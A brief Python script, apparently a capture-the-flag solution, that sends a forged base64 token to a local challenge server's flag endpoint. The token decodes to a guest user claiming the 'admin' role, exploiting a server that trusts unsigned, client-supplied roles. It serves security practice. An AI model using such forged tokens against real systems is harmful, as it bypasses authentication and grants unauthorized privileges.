import requests

token = "eyJ1c2VybmFtZSI6ICJndWVzdCIsICJyb2xlIjogImFkbWluIn0="

r = requests.post("http://localhost:1337/flag", json={"token": token})

print(r.status_code)
print(r.text)
